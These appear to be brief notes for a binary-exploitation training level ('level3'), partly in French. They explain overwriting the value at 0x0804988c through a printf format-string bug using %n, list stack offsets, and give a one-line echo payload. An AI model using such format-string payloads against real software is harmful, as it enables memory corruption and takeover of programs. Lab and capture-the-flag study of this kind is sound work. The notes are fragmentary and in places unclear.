## level3

We need to set the value at 0x0804988c to 0x40. To do so, we exploit `printf`
to make him write this value to this adress with `%n`.

### Useful infos:
```
0x218 = 536
0x200 = 512
0x208 = 520

esp: ebp - 536


adresse ret pour gets puis pour fgets
adresse du buffer de taille 520
200
stdin
??
debut buffer
AAAA
BBBB
...

exploit:
echo -e "\x8c\x98\x04\x08%d%d%dZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHI%n"
```
